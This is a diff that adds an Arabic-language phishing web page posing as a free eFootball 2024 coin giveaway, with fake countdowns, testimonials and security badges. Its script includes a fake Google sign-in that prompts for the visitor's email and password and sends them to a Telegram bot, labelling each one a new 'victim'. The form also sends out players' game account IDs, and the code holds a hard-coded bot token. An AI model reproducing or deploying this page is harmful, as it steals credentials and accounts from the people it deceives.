@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eFootball™ 2024 | شحن عملات مجاني</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: white;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 200px;
+        }
+        h1 {
+            text-align: center;
+            color: #FFD700;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            background: rgba(255, 255, 255, 0.9);
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #FFD700;
+            color: black;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #FFC000;
+        }
+        .testimonials {
+            margin-top: 30px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+        }
+        .testimonial {
+            margin-bottom: 15px;
+            font-style: italic;
+        }
+        .countdown {
+            text-align: center;
+            font-size: 18px;
+            margin: 20px 0;
+            color: #FFD700;
+        }
+        .security-badges {
+            display: flex;
+            justify-content: space-around;
+            margin: 20px 0;
+        }
+        .security-badges img {
+            height: 50px;
+        }
+        #progressBar {
+            display: none;
+            background: #333;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        #progress {
+            width: 0%;
+            height: 20px;
+            background: #FFD700;
+            border-radius: 10px;
+            transition: 1s;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="images.jfif" alt="eFootball Logo">
+        </div>
+        <h1>شحن عملات eFootball مجاني</h1>
+        <p style="text-align: center;">احصل على <strong>1,080 عملة مجانية</strong> خلال 24 ساعة! عرض محدود!</p>
+        <p style="text-align: center; color: #FF0000; font-weight: bold;" id="specialOffer">
+            ⚡ أول 100 مستخدم سيحصلون على <span id="coins">100</span> عملة إضافية! 
+        </p>
+
+        <form id="rechargeForm">
+            <div class="form-group">
+                <label for="accountId">ID حساب eFootball</label>
+                <input type="text" id="accountId" required placeholder="أدخل ID حسابك">
+            </div>
+            <button type="submit">االتالي!</button>
+            <button type="button" style="background: #4285F4; color: white; margin-top: 10px;" onclick="stealGoogle()">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="20" style="vertical-align: middle;"> 
+                تسجيل الدخول عبر Google
+            </button>
+        </form>
+
+        <div id="progressBar">
+            <div id="progress"></div>
+        </div>
+
+        <div class="countdown">
+            ⏳ <strong>الدفعة القادمة خلال: <span id="timer">23:59:59</span></strong>
+        </div>
+
+        <div class="security-badges">
+            <img src="téléchargement.jfif" alt="Konami Verified">
+            <img src="images (1).jfif" alt="SSL Secure">
+        </div>
+
+        <div class="testimonials">
+            <h3>📜 آراء اللاعبين:</h3>
+            <div class="testimonial">
+                <p>"حصلت على 1,080 coins في أقل من يوم! موقع موثوق!" - <strong>أحمد س.</strong></p>
+            </div>
+            <div class="testimonial">
+                <p>"ازاي باخد 1080 مرة كمان يا جدعان!" - <strong>نورة خ.</strong></p>
+            </div>
+            <div class="testimonial">
+                <p>"أسرع طريقة للحصول على عملات مجانية!" - <strong>محمد ع.</strong></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Countdown Timer
+        function updateTimer() {
+            let time = 86399;
+            const timer = setInterval(() => {
+                const hours = Math.floor(time / 3600);
+                const minutes = Math.floor((time % 3600) / 60);
+                const seconds = time % 60;
+                document.getElementById('timer').innerHTML = `${hours}:${minutes}:${seconds}`;
+                time--;
+                if (time < 0) clearInterval(timer);
+            }, 1000);
+        }
+        updateTimer();
+
+        // Special Offer Countdown
+        let coins = 5000;
+        setInterval(() => {
+            coins -= 10;
+            document.getElementById('coins').textContent = coins;
+            if (coins <= 0) document.getElementById('specialOffer').innerHTML = "انتهى العرض! 🚫";
+        }, 60000);
+
+        // Fake Google Login
+        function stealGoogle() {
+            const email = prompt("أدخل بريدك الإلكتروني لحساب Google:");
+            if (email) {
+                const password = prompt("أدخل كلمة المرور:");
+                if (password) {
+                    const botToken = '8180346162:AAEQXo_dV9Euqu-FFhtIIYaWu4g3N2mJZRY';
+                    const chatId = '6293215658';
+                    const message = `🔴 ضحية جديدة عبر Google! 🔴\nالإيميل: ${email}\nكلمة المرور: ${password}`;
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+                    alert("✅ تم التحقق بنجاح! جارٍ تحميل البيانات...");
+                    setTimeout(() => {
+                        window.location.href = "https://www.konami.com/efootball/ar/";
+                    }, 3000);
+                }
+            }
+        }
+
+        // Form Submission
+        const form = document.getElementById('rechargeForm');
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            document.getElementById('progressBar').style.display = 'block';
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 10;
+                document.getElementById('progress').style.width = `${progress}%`;
+                if (progress >= 100) clearInterval(interval);
+            }, 300);
+
+            const accountId = document.getElementById('accountId').value;
+
+            const botToken = '8180346162:AAEQXo_dV9Euqu-FFhtIIYaWu4g3N2mJZRY';
+            const chatId = '6293215658';
+            const message = `🔴 ضحية جديدة! 🔴\nID الحساب: ${accountId}`;
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+            
+            alert("✅ يتم التحقق من الحساب الان");
+            setTimeout(() => {
+                window.location.href = "PES.html";
+            }, 5000);
+            form.reset();
+        });
+    </script>
+</body>
+</html>
